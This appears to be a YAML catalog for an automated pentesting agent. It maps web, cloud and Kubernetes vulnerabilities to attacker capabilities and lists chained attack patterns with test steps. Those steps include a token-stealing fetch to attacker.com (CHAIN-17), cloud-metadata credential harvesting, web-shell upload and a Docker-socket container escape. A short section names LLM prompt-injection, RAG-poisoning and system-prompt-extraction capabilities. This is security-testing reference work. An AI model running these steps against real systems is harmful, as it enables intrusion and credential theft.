@@ -1,0 +1,1216 @@
+# Chain Pattern Catalog
+# ====================
+# Knowledge base for the Chain Analysis Agent. Contains capability taxonomy,
+# vulnerability-to-capability mappings, and 30 known attack chain patterns.
+#
+# The agent uses this catalog for pattern matching in hypothesis mode and
+# can discover emergent chains beyond these patterns via creative reasoning.
+
+# =============================================================================
+# CAPABILITY TAXONOMY (~25 capabilities)
+# =============================================================================
+# Each capability represents something an attacker can do after exploiting
+# a vulnerability. Chains form when one finding GRANTS a capability that
+# another finding REQUIRES.
+
+capabilities:
+  - id: unauthenticated_access
+    description: "Can interact with the application without credentials"
+    category: access
+
+  - id: authenticated_session
+    description: "Has a valid user-level session/token"
+    category: access
+
+  - id: admin_session
+    description: "Has admin or elevated privilege access"
+    category: access
+
+  - id: javascript_execution
+    description: "Can execute JavaScript in a victim's browser context"
+    category: execution
+
+  - id: sql_execution
+    description: "Can execute arbitrary SQL queries against the database"
+    category: execution
+
+  - id: command_execution
+    description: "Can execute operating system commands on the server"
+    category: execution
+
+  - id: template_execution
+    description: "Can execute server-side template expressions"
+    category: execution
+
+  - id: deserialization_rce
+    description: "Can achieve RCE via insecure deserialization"
+    category: execution
+
+  - id: file_read
+    description: "Can read arbitrary files on the server"
+    category: filesystem
+
+  - id: file_write
+    description: "Can write arbitrary files on the server"
+    category: filesystem
+
+  - id: path_traversal
+    description: "Can traverse directory structure beyond intended paths"
+    category: filesystem
+
+  - id: upload_execution
+    description: "Can upload and execute server-side code"
+    category: filesystem
+
+  - id: ssrf_request
+    description: "Can make HTTP requests from the server to arbitrary destinations"
+    category: network
+
+  - id: internal_network_access
+    description: "Can reach internal services not exposed to the internet"
+    category: network
+
+  - id: cloud_metadata_access
+    description: "Can access cloud provider metadata endpoint (169.254.169.254)"
+    category: network
+
+  - id: dns_control
+    description: "Can manipulate DNS records or take over subdomains"
+    category: network
+
+  - id: credential_theft
+    description: "Can steal user credentials, tokens, or session identifiers"
+    category: data
+
+  - id: data_exfiltration
+    description: "Can extract sensitive data from the application or database"
+    category: data
+
+  - id: session_hijack
+    description: "Can take over another user's active session"
+    category: data
+
+  - id: token_forgery
+    description: "Can create or modify authentication tokens"
+    category: data
+
+  - id: privilege_escalation
+    description: "Can elevate from regular user to admin or higher privilege"
+    category: escalation
+
+  - id: cache_control
+    description: "Can manipulate cached HTTP responses"
+    category: manipulation
+
+  - id: header_injection
+    description: "Can inject arbitrary HTTP headers into responses"
+    category: manipulation
+
+  - id: prototype_pollution
+    description: "Can pollute JavaScript object prototypes"
+    category: manipulation
+
+  - id: api_abuse
+    description: "Can abuse API endpoints without rate limiting constraints"
+    category: abuse
+
+  - id: cloud_credential_harvest
+    description: "Has obtained temporary cloud credentials (access key + secret + session token)"
+    category: cloud
+
+  - id: iam_admin_access
+    description: "Has IAM admin or equivalent permissions in a cloud account"
+    category: cloud
+
+  - id: cloud_storage_read
+    description: "Can read objects from cloud storage (S3/Blob/GCS)"
+    category: cloud
+
+  - id: cloud_storage_write
+    description: "Can write objects to cloud storage"
+    category: cloud
+
+  - id: cloud_secrets_read
+    description: "Can read secrets from cloud secrets management service"
+    category: cloud
+
+  - id: k8s_cluster_access
+    description: "Has valid credentials/token for Kubernetes API server"
+    category: cloud
+
+  - id: k8s_admin_access
+    description: "Has cluster-admin or equivalent Kubernetes RBAC permissions"
+    category: cloud
+
+  - id: container_escape
+    description: "Has escaped container to access the host node"
+    category: cloud
+
+  - id: serverless_invocation
+    description: "Can directly invoke serverless functions bypassing API layer"
+    category: cloud
+
+  # --- AI / LLM capabilities (ai_targets scope) ---
+  - id: model_instruction_control
+    description: "Can override the model's instructions via injected input (the model follows the attacker)"
+    category: ai
+
+  - id: model_output_control
+    description: "Can steer the model's output content/format (e.g. emit an active markdown/HTML/SQL payload)"
+    category: ai
+
+  - id: agent_tool_invocation
+    description: "Can cause a tool-using agent to issue a tool call (captured, capability-not-execution)"
+    category: ai
+
+  - id: rag_retrieval_influence
+    description: "Can place/poison content the RAG app retrieves into the model's context"
+    category: ai
+
+  - id: system_prompt_disclosure
+    description: "Has extracted the system prompt / tool schema (recon for excessive-agency abuse)"
+    category: ai
+
+# =============================================================================
+# VULNERABILITY-TO-CAPABILITY MAPPING (~20 vuln types)
+# =============================================================================
+# Maps vulnerability types to the capabilities they grant and require.
+
+vuln_capability_map:
+
+  xss_reflected:
+    grants: [javascript_execution, credential_theft, session_hijack]
+    requires: [unauthenticated_access]
+    severity_base: medium
+
+  xss_stored:
+    grants: [javascript_execution, credential_theft, session_hijack]
+    requires: [authenticated_session]
+    severity_base: high
+
+  xss_dom:
+    grants: [javascript_execution, credential_theft]
+    requires: [unauthenticated_access]
+    severity_base: medium
+
+  sqli:
+    grants: [sql_execution, data_exfiltration, credential_theft]
+    requires: [unauthenticated_access]
+    severity_base: high
+
+  ssrf:
+    grants: [ssrf_request, internal_network_access, cloud_metadata_access]
+    requires: [unauthenticated_access]
+    severity_base: medium
+
+  command_injection:
+    grants: [command_execution, file_read, file_write]
+    requires: [unauthenticated_access]
+    severity_base: critical
+
+  ssti:
+    grants: [template_execution, command_execution]
+    requires: [unauthenticated_access]
+    severity_base: high
+
+  idor:
+    grants: [data_exfiltration, privilege_escalation]
+    requires: [authenticated_session]
+    severity_base: medium
+
+  path_traversal:
+    grants: [file_read, path_traversal]
+    requires: [unauthenticated_access]
+    severity_base: medium
+
+  jwt_weakness:
+    grants: [token_forgery, privilege_escalation]
+    requires: [unauthenticated_access]
+    severity_base: high
+
+  missing_httponly:
+    grants: [credential_theft]
+    requires: [javascript_execution]
+    severity_base: low
+    note: "Amplifier — only exploitable via XSS"
+
+  missing_rate_limit:
+    grants: [api_abuse]
+    requires: [unauthenticated_access]
+    severity_base: low
+    note: "Amplifier — enables brute force and enumeration"
+
+  cors_misconfiguration:
+    grants: [credential_theft]
+    requires: [javascript_execution]
+    severity_base: medium
+    note: "Only exploitable if credentials mode is enabled"
+
+  http_smuggling:
+    grants: [cache_control, header_injection]
+    requires: [unauthenticated_access]
+    severity_base: high
+
+  cache_poisoning:
+    grants: [cache_control, javascript_execution]
+    requires: [header_injection]
+    severity_base: high
+
+  file_upload:
+    grants: [upload_execution, file_write]
+    requires: [authenticated_session]
+    severity_base: high
+
+  deserialization:
+    grants: [deserialization_rce, command_execution]
+    requires: [unauthenticated_access]
+    severity_base: critical
+
+  prototype_pollution:
+    grants: [prototype_pollution, javascript_execution]
+    requires: [unauthenticated_access]
+    severity_base: medium
+
+  token_in_localstorage:
+    grants: [credential_theft]
+    requires: [javascript_execution]
+    severity_base: low
+    note: "Amplifier — only exploitable via XSS"
+
+  weak_password_policy:
+    grants: [credential_theft]
+    requires: [unauthenticated_access]
+    severity_base: low
+
+  missing_csp:
+    grants: [javascript_execution]
+    requires: []
+    severity_base: info
+    note: "Amplifier — removes XSS payload restrictions"
+
+  missing_hsts:
+    grants: [credential_theft]
+    requires: [internal_network_access]
+    severity_base: low
+
+  exposed_secrets:
+    grants: [credential_theft, authenticated_session, admin_session]
+    requires: [file_read, unauthenticated_access]
+    severity_base: critical
+
+  subdomain_takeover:
+    grants: [dns_control, javascript_execution, credential_theft]
+    requires: [unauthenticated_access]
+    severity_base: high
+
+  cloud_metadata_exposure:
+    grants: [cloud_credential_harvest, cloud_storage_read, iam_admin_access]
+    requires: [cloud_metadata_access]
+    severity_base: critical
+
+  iam_privesc:
+    grants: [iam_admin_access, cloud_secrets_read, cloud_storage_write]
+    requires: [cloud_credential_harvest]
+    severity_base: critical
+
+  k8s_rbac_abuse:
+    grants: [k8s_admin_access, cloud_secrets_read]
+    requires: [k8s_cluster_access]
+    severity_base: high
+
+  container_escape_vuln:
+    grants: [container_escape, command_execution]
+    requires: [k8s_cluster_access]
+    severity_base: critical
+
+  lambda_injection:
+    grants: [serverless_invocation, cloud_credential_harvest]
+    requires: [unauthenticated_access]
+    severity_base: high
+
+  public_storage:
+    grants: [cloud_storage_read, data_exfiltration]
+    requires: [unauthenticated_access]
+    severity_base: high
+
+# =============================================================================
+# CHAIN PATTERNS (30 patterns: CHAIN-01 through CHAIN-30)
+# =============================================================================
+# Each pattern describes a known multi-step attack with conditions,
+# test steps, and combined severity.
+
+chain_patterns:
+
+  - id: CHAIN-01
+    name: "XSS to Cookie Theft"
+    description: "Reflected/stored XSS steals session cookies due to missing HttpOnly flag"
+    steps:
+      - vuln: xss_reflected
+        grants: [javascript_execution]
+      - vuln: missing_httponly
+        requires: [javascript_execution]
+        grants: [credential_theft, session_hijack]
+    severity_combined: high
+    test_steps:
+      - "Inject XSS payload that reads document.cookie"
+      - "Verify cookie contains session token"
+      - "Use stolen cookie to access authenticated endpoints"
+    conditions: "HttpOnly flag missing on session cookies AND XSS vulnerability exists"
+
+  - id: CHAIN-02
+    name: "XSS to Token Theft via localStorage"
+    description: "XSS reads JWT/session token stored in localStorage"
+    steps:
+      - vuln: xss_reflected
+        grants: [javascript_execution]
+      - vuln: token_in_localstorage
+        requires: [javascript_execution]
+        grants: [credential_theft, session_hijack]
+    severity_combined: high
+    test_steps:
+      - "Inject XSS payload that reads localStorage keys"
+      - "Extract JWT or session token"
+      - "Replay stolen token against API"
+    conditions: "Auth token stored in localStorage AND XSS vulnerability exists"
+
+  - id: CHAIN-03
+    name: "XSS to Session Hijack to Privilege Escalation"
+    description: "XSS steals admin session, attacker escalates to admin privileges"
+    steps:
+      - vuln: xss_stored
+        grants: [javascript_execution, credential_theft]
+      - vuln: missing_httponly
+        requires: [javascript_execution]
+        grants: [session_hijack]
+      - vuln: idor
+        requires: [authenticated_session]
+        grants: [privilege_escalation]
+    severity_combined: critical
+    test_steps:
+      - "Store XSS payload that exfiltrates cookies"
+      - "Wait for admin to trigger stored XSS"
+      - "Use admin session to access privilege escalation endpoints"
+    conditions: "Stored XSS + missing HttpOnly + IDOR or privilege escalation path"
+
+  - id: CHAIN-04
+    name: "SSRF to Cloud Metadata to Key Theft"
+    description: "SSRF accesses cloud metadata endpoint, steals IAM credentials"
+    steps:
+      - vuln: ssrf
+        grants: [ssrf_request, internal_network_access, cloud_metadata_access]
+      - target: "169.254.169.254"
+        requires: [cloud_metadata_access]
+        grants: [credential_theft, admin_session]
+    severity_combined: critical
+    test_steps:
+      - "Submit SSRF payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "Extract AWS access key, secret key, session token"
+      - "Verify credentials are valid with aws sts get-caller-identity"
+    conditions: "SSRF vulnerability + cloud-hosted infrastructure (AWS/GCP/Azure)"
+
+  - id: CHAIN-05
+    name: "SSRF to Internal Service Discovery"
+    description: "SSRF probes internal network, discovers unauthenticated internal services"
+    steps:
+      - vuln: ssrf
+        grants: [ssrf_request, internal_network_access]
+      - target: "internal services"
+        requires: [internal_network_access]
+        grants: [data_exfiltration, admin_session]
+    severity_combined: high
+    test_steps:
+      - "Enumerate internal IPs via SSRF (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)"
+      - "Probe for common internal services (Redis, Elasticsearch, admin panels)"
+      - "Access discovered services without authentication"
+    conditions: "SSRF vulnerability + internal services without network-level auth"
+
+  - id: CHAIN-06
+    name: "SQL Injection to Credential Dump to Admin Access"
+    description: "SQLi extracts user credentials, attacker logs in as admin"
+    steps:
+      - vuln: sqli
+        grants: [sql_execution, data_exfiltration]
+      - action: "dump credentials"
+        requires: [sql_execution]
+        grants: [credential_theft]
+      - action: "login as admin"
+        requires: [credential_theft]
+        grants: [admin_session]
+    severity_combined: critical
+    test_steps:
+      - "Extract user table via sqlmap --dump"
+      - "Crack password hashes (if hashed) or use cleartext passwords"
+      - "Login as admin user"
+    conditions: "SQL injection + user credentials stored in database"
+
+  - id: CHAIN-07
+    name: "SQL Injection to File Read"
+    description: "SQLi reads server files via LOAD_FILE or similar functions"
+    steps:
+      - vuln: sqli
+        grants: [sql_execution]
+      - action: "read files"
+        requires: [sql_execution]
+        grants: [file_read, credential_theft]
+    severity_combined: critical
+    test_steps:
+      - "Use LOAD_FILE('/etc/passwd') or equivalent"
+      - "Read application config files for database credentials"
+      - "Read private keys or other sensitive files"
+    conditions: "SQL injection with FILE privilege on MySQL or equivalent"
+
+  - id: CHAIN-08
+    name: "Missing CSP Amplifies XSS"
+    description: "Absence of CSP removes restrictions on XSS payload execution"
+    steps:
+      - vuln: missing_csp
+        grants: [javascript_execution]
+        note: "amplifier"
+      - vuln: xss_reflected
+        grants: [javascript_execution, credential_theft]
+    severity_combined: high
+    test_steps:
+      - "Verify no Content-Security-Policy header"
+      - "Inject complex XSS payload (external script load, fetch to attacker server)"
+      - "Confirm payload executes without CSP blocking"
+    conditions: "No CSP header AND XSS vulnerability exists"
+
+  - id: CHAIN-09
+    name: "IDOR plus Missing Rate Limit enables Mass Enumeration"
+    description: "IDOR allows accessing other users' data, missing rate limit allows automated enumeration"
+    steps:
+      - vuln: idor
+        grants: [data_exfiltration]
+      - vuln: missing_rate_limit
+        grants: [api_abuse]
+    severity_combined: high
+    test_steps:
+      - "Confirm IDOR by changing resource ID"
+      - "Script rapid sequential requests incrementing IDs"
+      - "Verify no rate limiting blocks enumeration"
+      - "Calculate total records extractable"
+    conditions: "IDOR on enumerable resource + no rate limiting"
+
+  - id: CHAIN-10
+    name: "Weak JWT to Privilege Escalation"
+    description: "JWT algorithm confusion or weak signing enables token forgery for admin access"
+    steps:
+      - vuln: jwt_weakness
+        grants: [token_forgery]
+      - action: "forge admin token"
+        requires: [token_forgery]
+        grants: [admin_session, privilege_escalation]
+    severity_combined: critical
+    test_steps:
+      - "Decode JWT and identify algorithm"
+      - "Attempt alg:none bypass"
+      - "Attempt RS256→HS256 key confusion"
+      - "Forge token with admin role claim"
+    conditions: "JWT with weak algorithm or exposed signing key"
+
+  - id: CHAIN-11
+    name: "File Upload plus Path Traversal to RCE"
+    description: "Upload web shell with path traversal to place it in web root"
+    steps:
+      - vuln: file_upload
+        grants: [file_write]
+      - vuln: path_traversal
+        requires: [file_write]
+        grants: [upload_execution, command_execution]
+    severity_combined: critical
+    test_steps:
+      - "Upload PHP/JSP shell with filename ../../webroot/shell.php"
+      - "Navigate to uploaded shell URL"
+      - "Execute OS command via shell"
+    conditions: "File upload + path traversal in filename + server-side execution"
+
+  - id: CHAIN-12
+    name: "HTTP Smuggling to Cache Poisoning to Stored XSS"
+    description: "Request smuggling desynchronizes proxy/backend, poisoning cache with XSS"
+    steps:
+      - vuln: http_smuggling
+        grants: [cache_control, header_injection]
+      - vuln: cache_poisoning
+        requires: [header_injection]
+        grants: [javascript_execution]
+    severity_combined: critical
+    test_steps:
+      - "Identify CL.TE or TE.CL desync"
+      - "Craft smuggled request with XSS payload"
+      - "Verify poisoned response is cached"
+      - "Confirm other users receive poisoned response"
+    conditions: "Frontend proxy + backend server with different parsing + cacheable responses"
+
+  - id: CHAIN-13
+    name: "CORS Misconfiguration plus XSS enables Cross-Origin Data Theft"
+    description: "CORS reflects arbitrary origins with credentials, XSS on any domain can steal data"
+    steps:
+      - vuln: cors_misconfiguration
+        grants: [credential_theft]
+        requires: [javascript_execution]
+      - vuln: xss_reflected
+        grants: [javascript_execution]
+    severity_combined: high
+    test_steps:
+      - "Verify CORS reflects origin with credentials: true"
+      - "From attacker page, make credentialed cross-origin request"
+      - "Read response containing authenticated user data"
+    conditions: "CORS allows arbitrary origins with credentials + any XSS"
+
+  - id: CHAIN-14
+    name: "SSTI to RCE"
+    description: "Template injection escalates to remote code execution"
+    steps:
+      - vuln: ssti
+        grants: [template_execution, command_execution]
+    severity_combined: critical
+    test_steps:
+      - "Inject {{7*7}} and verify 49 in response"
+      - "Escalate to OS command execution via template engine-specific payload"
+      - "Execute whoami or id as proof"
+    conditions: "Server-side template engine with code execution capabilities"
+
+  - id: CHAIN-15
+    name: "Subdomain Takeover to Cookie Theft"
+    description: "Dangling subdomain takeover enables cookie theft for parent domain"
+    steps:
+      - vuln: subdomain_takeover
+        grants: [dns_control, javascript_execution]
+      - action: "steal parent domain cookies"
+        requires: [dns_control]
+        grants: [credential_theft, session_hijack]
+    severity_combined: high
+    test_steps:
+      - "Identify dangling CNAME/A record"
+      - "Claim the external service"
+      - "Host page that reads cookies scoped to parent domain"
+      - "Verify cookie access"
+    conditions: "Dangling DNS record + cookies scoped to parent domain"
+
+  - id: CHAIN-16
+    name: "Prototype Pollution to XSS"
+    description: "Client-side prototype pollution enables DOM-based XSS"
+    steps:
+      - vuln: prototype_pollution
+        grants: [prototype_pollution]
+      - action: "trigger XSS gadget"
+        requires: [prototype_pollution]
+        grants: [javascript_execution, credential_theft]
+    severity_combined: high
+    test_steps:
+      - "Pollute Object.prototype via URL params or JSON"
+      - "Identify XSS gadget in application JS"
+      - "Trigger gadget via polluted prototype"
+    conditions: "Client-side prototype pollution + XSS gadget in JS libraries"
+
+  - id: CHAIN-17
+    name: "Token in localStorage plus XSS to Session Theft"
+    description: "Auth token in localStorage is trivially stolen via any XSS"
+    steps:
+      - vuln: token_in_localstorage
+        requires: [javascript_execution]
+        grants: [credential_theft]
+      - vuln: xss_reflected
+        grants: [javascript_execution]
+    severity_combined: high
+    test_steps:
+      - "Confirm token stored in localStorage"
+      - "Inject XSS: fetch('https://attacker.com/steal?t='+localStorage.getItem('token'))"
+      - "Replay stolen token against API"
+    conditions: "Auth token in localStorage AND any XSS vulnerability"
+
+  - id: CHAIN-18
+    name: "Deserialization to RCE"
+    description: "Insecure deserialization leads to remote code execution"
+    steps:
+      - vuln: deserialization
+        grants: [deserialization_rce, command_execution]
+    severity_combined: critical
+    test_steps:
+      - "Identify serialization format (Java, Python pickle, PHP)"
+      - "Craft deserialization payload with ysoserial/equivalent"
+      - "Send payload and verify code execution via OOB callback"
+    conditions: "Deserialization sink reachable with user-controlled data"
+
+  - id: CHAIN-19
+    name: "Weak Password Policy plus No Rate Limit to Credential Stuffing"
+    description: "Weak passwords + no rate limiting enables brute force credential attacks"
+    steps:
+      - vuln: weak_password_policy
+        grants: [credential_theft]
+      - vuln: missing_rate_limit
+        grants: [api_abuse]
+    severity_combined: medium
+    test_steps:
+      - "Confirm weak password requirements"
+      - "Send 100+ login attempts without lockout or rate limiting"
+      - "Test common password list against known usernames"
+    conditions: "Weak password policy + no account lockout + no rate limiting"
+
+  - id: CHAIN-20
+    name: "Missing HSTS plus Network Position to Session Hijack"
+    description: "Without HSTS, attacker on network can intercept HTTP cookies"
+    steps:
+      - vuln: missing_hsts
+        requires: [internal_network_access]
+        grants: [credential_theft]
+    severity_combined: medium
+    test_steps:
+      - "Verify no Strict-Transport-Security header"
+      - "Attempt SSLstrip-style downgrade attack"
+      - "Intercept cookies sent over HTTP"
+    conditions: "No HSTS + attacker on same network + any HTTP traffic"
+
+  - id: CHAIN-21
+    name: "IDOR plus Weak JWT to Full Account Takeover"
+    description: "IDOR accesses user data, weak JWT enables impersonation of any user"
+    steps:
+      - vuln: idor
+        grants: [data_exfiltration]
+      - vuln: jwt_weakness
+        grants: [token_forgery]
+      - action: "impersonate any user"
+        requires: [token_forgery, data_exfiltration]
+        grants: [admin_session]
+    severity_combined: critical
+    test_steps:
+      - "Enumerate user IDs via IDOR"
+      - "Forge JWT for admin user ID"
+      - "Access admin-only functionality"
+    conditions: "IDOR on user enumeration + JWT vulnerability"
+
+  - id: CHAIN-22
+    name: "Path Traversal to Credential Discovery to Lateral Movement"
+    description: "File read reveals credentials that provide access to other services"
+    steps:
+      - vuln: path_traversal
+        grants: [file_read]
+      - action: "read config files"
+        requires: [file_read]
+        grants: [credential_theft]
+      - action: "access other services"
+        requires: [credential_theft]
+        grants: [internal_network_access, admin_session]
+    severity_combined: critical
+    test_steps:
+      - "Read /etc/passwd, application config files"
+      - "Extract database credentials, API keys, service tokens"
+      - "Access database or internal services with discovered credentials"
+    conditions: "Path traversal + readable config files with credentials"
+
+  - id: CHAIN-23
+    name: "GraphQL Introspection to IDOR to Mass Data Extraction"
+    description: "Introspection reveals schema, IDOR enables unauthorized data access at scale"
+    steps:
+      - action: "introspection query"
+        grants: [data_exfiltration]
+      - vuln: idor
+        requires: [authenticated_session]
+        grants: [data_exfiltration]
+      - vuln: missing_rate_limit
+        grants: [api_abuse]
+    severity_combined: high
+    test_steps:
+      - "Run introspection query to map full schema"
+      - "Identify queries returning user data"
+      - "Enumerate all user records via ID manipulation"
+      - "Verify no rate limiting on enumeration"
+    conditions: "GraphQL introspection enabled + IDOR + no rate limiting"
+
+  - id: CHAIN-24
+    name: "Exposed API Docs to Unauthenticated Endpoint Discovery"
+    description: "Swagger/OpenAPI docs reveal endpoints that lack authentication"
+    steps:
+      - action: "discover API docs"
+        grants: [data_exfiltration]
+      - action: "find unprotected endpoints"
+        requires: [data_exfiltration]
+        grants: [unauthenticated_access, data_exfiltration]
+    severity_combined: medium
+    test_steps:
+      - "Access /swagger.json, /openapi.json, /api-docs"
+      - "List all endpoints from spec"
+      - "Test each endpoint without authentication"
+      - "Document endpoints returning data without auth"
+    conditions: "Exposed API documentation + missing auth on some endpoints"
+
+  - id: CHAIN-25
+    name: "Race Condition plus IDOR to Double Spending"
+    description: "Race condition on financial operation combined with IDOR"
+    steps:
+      - vuln: idor
+        grants: [privilege_escalation]
+      - action: "race condition"
+        requires: [authenticated_session]
+        grants: [data_exfiltration]
+    severity_combined: critical
+    test_steps:
+      - "Identify financial or resource-creation endpoint"
+      - "Send concurrent identical requests (10+)"
+      - "Verify duplicate resources created or balance doubled"
+    conditions: "Race condition on state-changing operation + IDOR"
+
+  - id: CHAIN-26
+    name: "XSS plus Missing CORS to Cross-Site API Abuse"
+    description: "XSS enables cross-origin requests that misconfigured CORS allows"
+    steps:
+      - vuln: xss_reflected
+        grants: [javascript_execution]
+      - vuln: cors_misconfiguration
+        requires: [javascript_execution]
+        grants: [data_exfiltration, credential_theft]
+    severity_combined: high
+    test_steps:
+      - "Confirm XSS on any origin"
+      - "From XSS context, make cross-origin API request with credentials"
+      - "Verify CORS allows the request with credentials"
+      - "Read sensitive data from response"
+    conditions: "XSS + CORS misconfiguration with credentials"
+
+  - id: CHAIN-27
+    name: "Mass Assignment to Privilege Escalation"
+    description: "API accepts extra fields, attacker sets admin role on their own account"
+    steps:
+      - action: "mass assignment"
+        grants: [privilege_escalation]
+    severity_combined: high
+    test_steps:
+      - "Add role=admin to profile update request"
+      - "Add isAdmin=true to registration request"
+      - "Verify elevated privileges after update"
+    conditions: "API blindly binds request body to user object"
+
+  - id: CHAIN-28
+    name: "SAST Secrets in Git to Active Credentials to Data Breach"
+    description: "Secrets found in git history are still active, providing direct access"
+    steps:
+      - vuln: exposed_secrets
+        grants: [credential_theft]
+      - action: "use active credentials"
+        requires: [credential_theft]
+        grants: [admin_session, data_exfiltration]
+    severity_combined: critical
+    test_steps:
+      - "Extract secrets from git history via gitleaks"
+      - "Test each secret against its respective service"
+      - "Verify which credentials are still active"
+      - "Document accessible data/systems"
+    conditions: "Secrets in git history + credentials not rotated"
+
+  - id: CHAIN-29
+    name: "DNS Zone Transfer to Subdomain Discovery to Attack Surface Expansion"
+    description: "Zone transfer reveals all subdomains, expanding the attack surface"
+    steps:
+      - action: "zone transfer"
+        grants: [dns_control, data_exfiltration]
+      - action: "discover internal services"
+        requires: [data_exfiltration]
+        grants: [internal_network_access]
+    severity_combined: medium
+    test_steps:
+      - "Attempt AXFR zone transfer"
+      - "Catalog all discovered subdomains"
+      - "Probe each for running services"
+      - "Identify internal/staging services exposed"
+    conditions: "DNS server allows zone transfer"
+
+  - id: CHAIN-30
+    name: "WebSocket Hijack to Real-Time Data Interception"
+    description: "Missing WebSocket auth enables connection hijacking and data interception"
+    steps:
+      - action: "websocket hijack"
+        grants: [data_exfiltration, session_hijack]
+    severity_combined: high
+    test_steps:
+      - "Connect to WebSocket without authentication"
+      - "Subscribe to data channels"
+      - "Verify real-time data received without authorization"
+      - "Test cross-site WebSocket hijacking"
+    conditions: "WebSocket endpoint without authentication or origin validation"
+
+  - id: CHAIN-31
+    name: "SSRF to IMDS to IAM Role to Cloud Storage Exfiltration"
+    description: "Application SSRF reaches the cloud metadata endpoint, harvests temporary IAM credentials from the attached instance role, and uses them to read sensitive objects from cloud storage."
+    steps:
+      - vuln: ssrf
+        grants: [ssrf_request, internal_network_access, cloud_metadata_access]
+      - vuln: cloud_metadata_exposure
+        requires: [cloud_metadata_access]
+        grants: [cloud_credential_harvest]
+      - vuln: iam_privesc
+        requires: [cloud_credential_harvest]
+        grants: [iam_admin_access, cloud_storage_read]
+      - action: "exfiltrate cloud storage objects"
+        requires: [cloud_storage_read]
+        grants: [data_exfiltration]
+    severity_combined: critical
+    test_steps:
+      - "Confirm SSRF by submitting URL pointing to internal/loopback (e.g. http://127.0.0.1:80) and observing response from internal service"
+      - "Pivot SSRF payload to http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS) or http://169.254.169.254/metadata/identity/oauth2/token (Azure) or http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (GCP)"
+      - "Extract AccessKeyId / SecretAccessKey / Token (AWS) or access_token (Azure/GCP) from the metadata response"
+      - "Validate harvested credentials with aws sts get-caller-identity or equivalent gcloud/az whoami call"
+      - "Enumerate IAM permissions via aws iam list-attached-role-policies and aws iam get-policy-version (or equivalent)"
+      - "List accessible storage (aws s3 ls / az storage blob list / gsutil ls) and download a sample object as proof of read access"
+    conditions: "Application SSRF + workload running on cloud VM/container with attached IAM role + IMDSv1 enabled OR IMDSv2 reachable from app context"
+
+  - id: CHAIN-32
+    name: "Public Container Registry to Image Layer Secrets to Account Takeover"
+    description: "Publicly readable ECR/ACR/GCR container image is pulled, image layers are inspected with dive/skopeo and reveal hardcoded service credentials that grant cloud account access."
+    steps:
+      - vuln: public_storage
+        grants: [cloud_storage_read]
+      - action: "pull and inspect image layers"
+        requires: [cloud_storage_read]
+        grants: [credential_theft]
+      - vuln: iam_privesc
+        requires: [credential_theft]
+        grants: [iam_admin_access]
+    severity_combined: critical
+    test_steps:
+      - "Enumerate public images: aws ecr-public describe-repositories OR docker pull <registry>/<repo>:<tag> without authentication"
+      - "Pull image: docker pull <registry>/<repo>:<tag> and save: docker save -o image.tar <image>"
+      - "Inspect layers with dive <image> or trivy image --secret-config <image> for embedded secrets"
+      - "Search for credentials: tar xf image.tar && find . -type f | xargs grep -E 'AKIA|aws_secret|password|token' 2>/dev/null"
+      - "Test extracted credentials against the cloud API (aws sts get-caller-identity / az account show / gcloud auth list)"
+      - "Map permissions of the compromised principal and confirm production access"
+    conditions: "Container image registry has public-read permission + image contains hardcoded cloud credentials in layers, env, or build artifacts"
+
+  - id: CHAIN-33
+    name: "Lambda Event Injection to Environment Variable Leak to IAM Escalation"
+    description: "Direct Lambda invocation (bypassing API Gateway authorizer) returns environment variables in error/debug output. Variables contain cloud credentials that the Lambda execution role uses, enabling escalation."
+    steps:
+      - vuln: lambda_injection
+        grants: [serverless_invocation, cloud_credential_harvest]
+      - action: "trigger error path that leaks env vars"
+        requires: [serverless_invocation]
+        grants: [credential_theft]
+      - vuln: iam_privesc
+        requires: [credential_theft]
+        grants: [iam_admin_access, cloud_secrets_read]
+    severity_combined: high
+    test_steps:
+      - "Discover Lambda function name via API Gateway integration metadata or aws lambda list-functions"
+      - "Invoke Lambda directly: aws lambda invoke --function-name <fn> --payload '<crafted-event>' out.json"
+      - "Send malformed payload that triggers exception path; check for stack trace exposing process.env / os.environ"
+      - "Extract AWS_LAMBDA_*, custom DB_PASSWORD, API keys from exception output"
+      - "Test extracted Lambda execution role token: aws sts get-caller-identity"
+      - "Enumerate role permissions and pivot to secrets manager / parameter store reads"
+    conditions: "Lambda function has direct invoke permission for principals beyond API Gateway + error handling exposes environment + execution role has overly broad permissions"
+
+  - id: CHAIN-34
+    name: "K8s Pod Compromise to Container Escape to Node IAM to Cluster Admin"
+    description: "Compromised pod with privileged spec or hostPath mount escapes to the node, harvests the node's instance profile credentials from IMDS, and uses them to gain cluster-admin via cloud-IAM-to-K8s-RBAC mapping (EKS aws-auth, GKE Workload Identity, AKS managed identity)."
+    steps:
+      - vuln: k8s_rbac_abuse
+        grants: [k8s_cluster_access]
+      - vuln: container_escape_vuln
+        requires: [k8s_cluster_access]
+        grants: [container_escape, command_execution]
+      - action: "harvest node instance profile from IMDS"
+        requires: [container_escape]
+        grants: [cloud_credential_harvest]
+      - vuln: iam_privesc
+        requires: [cloud_credential_harvest]
+        grants: [iam_admin_access, k8s_admin_access]
+    severity_combined: critical
+    test_steps:
+      - "Get a foothold pod (kubectl exec or via app vuln in a pod)"
+      - "Check capabilities: cat /proc/self/status | grep CapEff and look for SYS_ADMIN, or check for privileged: true in pod spec"
+      - "Escape via mounted Docker socket (docker run -v /:/host alpine chroot /host) or via hostPID + nsenter"
+      - "From host, query IMDS: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
+      - "Use node role to update aws-auth ConfigMap (EKS) mapping role to system:masters, OR use IAM permissions to escalate via eks:AccessKubernetesApi"
+      - "Verify cluster-admin: kubectl auth can-i '*' '*' --all-namespaces"
+    conditions: "Pod with privileged spec / hostPath / hostPID / Docker socket mount + node has IAM role with eks:* or kubernetes-admin equivalent + IMDS accessible from node"
+
+  - id: CHAIN-35
+    name: "Cross-Account Trust Misconfiguration to Role Assumption to Data Access"
+    description: "Cross-account IAM role trust policy allows assumption from any external principal (no external ID, wildcard principal). Attacker assumes the role from their own account and reads cross-account data."
+    steps:
+      - vuln: iam_privesc
+        grants: [iam_admin_access]
+      - action: "assume cross-account role"
+        requires: [iam_admin_access]
+        grants: [cloud_credential_harvest, cloud_storage_read]
+      - action: "exfiltrate cross-account data"
+        requires: [cloud_storage_read]
+        grants: [data_exfiltration]
+    severity_combined: high
+    test_steps:
